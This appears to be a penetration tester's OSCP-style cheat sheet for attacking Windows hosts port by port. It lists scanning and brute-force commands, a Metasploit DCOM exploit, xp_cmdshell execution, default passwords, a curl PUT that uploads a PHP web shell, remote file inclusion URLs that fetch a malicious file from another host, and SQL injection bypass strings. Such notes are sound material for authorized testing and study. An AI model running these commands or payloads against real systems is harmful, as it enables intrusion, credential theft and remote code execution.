SCAN - WINDOWS

WINDOWS

## Info-sheet


- DNS-Domain name:
- Host name:
- OS: 
- Server:
- Workgroup:
- Windows domain:
- Services and ports:



Services and Ports:

### Recon

Always start with a stealthy scan to avoid closing ports.

# Syn-scan
nmap -sS 


# Scan all ports, might take a while.
nmap  -p-

# Service-version, default scripts, OS:
nmap  -sV -sC -O

# Scan for UDP
unicornscan -mU -v -I
nmap  -sU -vv -sV
 

# Connect to udp if one is open
nc -u  48772

# Monster scan
nmap  -p- -A -T4 -sC



### Port 21 - FTP

- Name:
- Version:
- Anonymous login:

Check for FTP version vulns
Check for Anonymous login 
Check for Read access
Check for Web root or root directories of any other accessible service 
Check for write access


nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 

nmap --script=ftp-anon.nse,ftp-bounce.nse,ftp-libopie.nse,ftp-proftpd-backdoor.nse,ftp-syst.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,tftp-enum.nse -p 21

# ftp bruteforce with nmap
nmap --script=ftp-brute.nse -p 21

### Port 22 - SSH

- Name:
- Version:
- Protocol:
- RSA-key-fingerprint:
- Takes-password:

nc -nv  22

nmap --script=ssh-auth-methods.nse,ssh-hostkey.nse,ssh-publickey-acceptance.nse,ssh-run.nse,ssh2-enum-algos.nse,sshv1.nse -p 22

# ssh bruteforce with nmap
nmap --script=ssh-brute.nse -p 22




telnet  22 

ssh root@
- 
If you have usernames/passwords test login with username@IPADDRESS


### Port 23 - Telnet

nmap --script=telnet-encryption.nse,telnet-ntlm-info.nse -p 23

# ssh bruteforce with nmap
nmap --script=telnet-brute.nse -p 23



### Port 25 http://www.suburbancomputer.com/tips_email.htm (smtp commands)

- Name:
- Version:
- VRFY:
- EXPN:



nc -nvv  25
HELO foo<cr><lf>

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 

nmap --script=smtp-ntlm-info.nse,smtp-open-relay.nse,smtp-strangeport.nse -p 25 

# smtp bruteforce with nmap
nmap --script=smtp-brute.nse -p 25

### GUI Application
snmpcheck



### Port 53 - http://resources.infosecinstitute.com/dns-hacking/#gref

broadcast-dns-service-discovery.nse
dns-blacklist.nse
dns-brute.nse
dns-cache-snoop.nse
dns-check-zone.nse
dns-client-subnet-scan.nse
dns-fuzz.nse
dns-ip6-arpa-scan.nse
dns-nsec-enum.nse
dns-nsec3-enum.nse
dns-nsid.nse
dns-random-srcport.nse
dns-random-txid.nse
dns-recursion.nse
dns-service-discovery.nse
dns-srv-enum.nse
dns-update.nse
dns-zeustracker.nse
dns-zone-transfer.nse
fcrdns.nse


### Port 110 - Pop3 http://www.suburbancomputer.com/tips_email.htm (pop3 commands)

- Name:
- Version:

nmap --script=pop3-brute.nse,pop3-capabilities.nse,pop3-ntlm-info.nse -p 110

pop3-brute.nse
pop3-capabilities.nse
pop3-ntlm-info.nse


### Port 111 - Rpcbind https://www.computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson4/index.html


rpcinfo -p 

bitcoinrpc-info.nse
deluge-rpc-brute.nse
metasploit-msgrpc-brute.nse
metasploit-xmlrpc-brute.nse
msrpc-enum.nse
nessus-xmlrpc-brute.nse
rpc-grind.nse
rpcap-brute.nse
rpcap-info.nse
rpcinfo.nse
xmlrpc-methods.nse


### Port 135 - MSRPC https://www.exploit-db.com/exploits/16749/

Some versions are vulnerable.


nmap  --script=msrpc-enum -p 135


Exploit:

msf > use exploit/windows/dcerpc/ms03_026_dcom

Exploit-DB	Vuln Name	                MS#	            2000
100	            RPC DCOM Long File	MS03-026	SP3/4

### Port 139/445 - SMB

- Name:
- Version:
- Domain/workgroup name:
- Domain-sid:
- Allows unauthenticated login:


nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse  -p 135,445


smb-brute.nse
smb-double-pulsar-backdoor.nse
smb-enum-domains.nse
smb-enum-groups.nse
smb-enum-processes.nse
smb-enum-services.nse
smb-enum-sessions.nse
smb-enum-shares.nse
smb-enum-users.nse
smb-flood.nse
smb-ls.nse
smb-mbenum.nse
smb-os-discovery.nse
smb-print-text.nse
smb-protocols.nse
smb-psexec.nse
smb-security-mode.nse
smb-server-stats.nse
smb-system-info.nse
smb-vuln-conficker.nse
smb-vuln-cve-2017-7494.nse
smb-vuln-cve2009-3103.nse
smb-vuln-ms06-025.nse
smb-vuln-ms07-029.nse
smb-vuln-ms08-067.nse
smb-vuln-ms10-054.nse
smb-vuln-ms10-061.nse
smb-vuln-ms17-010.nse
smb-vuln-regsvc-dos.nse
smb2-capabilities.nse
smb2-security-mode.nse
smb2-time.nse
smb2-vuln-uptime.nse


enum4linux -a 

rpcclient -U "" 
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall

smbclient -L 
smbclient ///tmp
smbclient \\\\\\ipc$ -U john
smbclient ///ipc$ -U john
smbclient ///admin$ -U john

Log in with shell:
winexe -U username // "cmd.exe" --system


Exploit:



### Port 161/162 UDP - SNMP


nmap -vv -sV -sU -Pn --script=snmp-netstat,snmp-processes -p 161,162 

snmp-brute.nse
snmp-hh3c-logins.nse
snmp-info.nse
snmp-interfaces.nse
snmp-ios-config.nse
snmp-netstat.nse
snmp-processes.nse
snmp-sysdescr.nse
snmp-win32-services.nse
snmp-win32-shares.nse
snmp-win32-software.nse
snmp-win32-users.nse

snmp-check -t  -c public
onesixone



# Common community strings
public
private
community




### Port 554 - RTSP

rtsp-methods.nse
rtsp-url-brute.nse


### Port 1030/1032/1033/1038

Used by RPC to connect in domain network. Usually nothing.

### Port 1433 - MSSQL

- Version:

broadcast-ms-sql-discover.nse
ms-sql-brute.nse
ms-sql-config.nse
ms-sql-dac.nse
ms-sql-dump-hashes.nse
ms-sql-empty-password.nse
ms-sql-hasdbaccess.nse
ms-sql-info.nse
ms-sql-ntlm-info.nse
ms-sql-query.nse
ms-sql-tables.nse
ms-sql-xp-cmdshell.nse

use auxiliary/scanner/mssql/mssql_ping

# Last options. Brute force.
scanner/mssql/mssql_login

# Log in to mssql
sqsh -S  -U sa

# Execute commands
xp_cmdshell 'date'
go


If you have credentials look in metasploit for other modules.

### Port 1434 (UDP)
UDP port 1434 is used for SQL Server named instances. 
The SQL Server Browser service listens on this port for incoming connections to a named instance. 
The service then responds to the client with the TCP port number for the requested named instance.


http://www.thatguyfromdelhi.com/2014/11/sqsh-freetds-with-sql2012-using.html
http://sqlmag.com/sql-server/sql-server-tcp-and-udp-ports

check here for possible rdp sql login solution 
https://dba.stackexchange.com/questions/96178/connect-to-server-with-ip-address-running-sql-express-instance-through-sql-manag
https://docs.microsoft.com/en-us/sql/relational-databases/scripting/sqlcmd-connect-to-the-database-engine
https://social.technet.microsoft.com/Forums/systemcenter/en-US/53fa9a6b-b9db-473f-8564-2ac4c62c3365/sql-server-2008-ports-to-open-on-windows-2008-r2-firewall?forum=operationsmanagerdeployment

### Port 1521 - Oracle

-Name:
-Version:
-Password protected:


tnscmd10g version -h 
tnscmd10g status -h 

oracle-brute-stealth.nse
oracle-brute.nse
oracle-enum-users.nse
oracle-sid-brute.nse
oracle-tns-version.nse



### Port 2100 - Oracle XML DB

Can be accessed through ftp.
Some default passwords here: https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm
- Name:
- Version:

Default logins:


sys:sys
scott:tiger


### Port 2049 - NFS https://www.computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson4/index.html


nfs-ls.nse
nfs-showmount.nse
nfs-statfs.nse


showmount -e 

If you find anything you can mount it like this:

mount :/ /tmp/NFS
mount -t :/ /tmp/NFS


###  Port 3306 - MySQL

- Name:
- Version:

mysql-audit.nse
mysql-brute.nse
mysql-databases.nse
mysql-dump-hashes.nse
mysql-empty-password.nse
mysql-enum.nse
mysql-info.nse
mysql-query.nse
mysql-users.nse
mysql-variables.nse
mysql-vuln-cve2012-2122.nse

```
mysql --host= -u root -p

nmap -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122  -p 3306


### Port 3339 - Oracle web interface

- Basic info about web service (apache, nginx, IIS)
- Server:
- Scripting language:
- Apache Modules:
- IP-address:
- Domain-name address:

### Port 3389 - Remote desktop

nmap -sV -Pn -vv -script=rdp-enum-encryption.nse,rdp-vuln-ms12-020.nse -p 3389

rdp-enum-encryption.nse
rdp-vuln-ms12-020.nse


Test logging in to see what OS is running


rdesktop -u guest -p guest  -g 94%

# Brute force
ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://

### Port 5985/47001 - WinRM https://thycotic.force.com/support/s/article/Configuring-WinRM-for-PowerShell

WinRM is an HTTP based remote management and shell protocol for Windows. 
The Windows Remote Management Service is responsible for this functionality. If WinRM is not configured for remote access,
 but the service is started, it listens for local requests on TCP port 47001. If you create listener it will still listen on 47001, 
 but also on the default TCP ports 5985 (HTTP) and 5986 (HTTPS).
 
 **can login with valid creds** 



### Port 80/8080/8000 - Web server

Don't forget non-standard ports that look like http

- Server:
- Scripting language:
- Apache Modules:
- Domain-name address:



- Web application
- Name:
- Version:

# Nmap

nmap -sV -Pn -vv --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-methods,http-method-tamper,http-passwd,http-robots.txt,http-devframework,http-enum,http-frontpage-login,http-git,http-iis-webdav-vuln,http-php-version,http-robots.txt,http-shellshock,http-vuln-cve2015-1635 -p 80 <TARGET IP>

# Nikto
nikto -h http://

# Nikto with squid proxy
nikto -h  -useproxy http://:4444

# Get header
curl -I 

# Get everything
curl -i 

# Get everything; follow redirect
curl -i -L 

# Check for title and all links
curl  -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'

# Look at page with just text
curl  -s -L | html2text -width '99' | uniq

# Check if it is possible to upload using put
curl -v -X OPTIONS http:///
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http:///test/shell.php

# Check for directory traversal
dotdotpwn.pl -m http -h  -M GET -o windows

#### DAV
davtest -url http://<IP> 
cadaver

#### Url brute force


# Dirb
dirb http:// -r -o dirb-.txt


# Gobuster - remove relevant response codes (403 for example)
gobuster -u http:// -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e


#### Default/Weak login

Google documentation for default passwords and test them:


site:webapplication.com password

admin admin
admin password
admin <blank>
admin nameofservice
root root
root admin
root password
root nameofservice
<username if you have> password
<username if you have> admin
<username if you have> username
<username if you have> nameofservice


#### LFI/RFI


# Kadimus
/root/Tools/Kadimus/kadimus -u http:///example.php?page=


# Bypass execution
http:///index.php?page=php://filter/convert.base64-encode/resource=index
base64 -d savefile.php

# Bypass extension
http:///page=http://192.168.1.101/maliciousfile.txt%00
http:///page=http://192.168.1.101/maliciousfile.txt?



#### SQL-Injection

NOT FOR EXAM    NOT FOR EXAM    NOT FOR EXAM

# Post
./sqlmap.py -r search-test.txt -p tfUPass

# Get
sqlmap -u "http:///index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http:// --dbms=mysql --crawl=3

NOT FOR EXAM    NOT FOR EXAM    NOT FOR EXAM


FOR EXAM https://xapax.gitbooks.io/security/content/sql-injections.html
This is the most classic, standard first test:
' or '1'='1
Then you have:
-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x



#### Sql-login-bypass


- Open Burp-suite
- Make and intercept request
- Send to intruder
- Cluster attack
- Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)
- Attack
- Check for response length variation

### Password brute force - last resort


cewl


### Port 443 - HTTPS

ssl-heartbleed.nse

Heartbleed:


sslscan :443





### Port 49152..... - default dynamic port range







## Vulnerability analysis

Now we have gathered information about the system. Now comes the part where we look for exploits and vulnerabilities and features.

### To try - List of possibilities
Add possible exploits here:


### Find sploits - Searchsploit and google

Where there are many exploits for a software, use google. It will automatically sort it by popularity.


site:exploit-db.com apache 2.4.7

# Remove dos-exploits

searchsploit Apache 2.4.7 | grep -v '/dos/'
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"

# Only search the title (exclude the path), add the -t
searchsploit -t Apache | grep -v '/dos/'







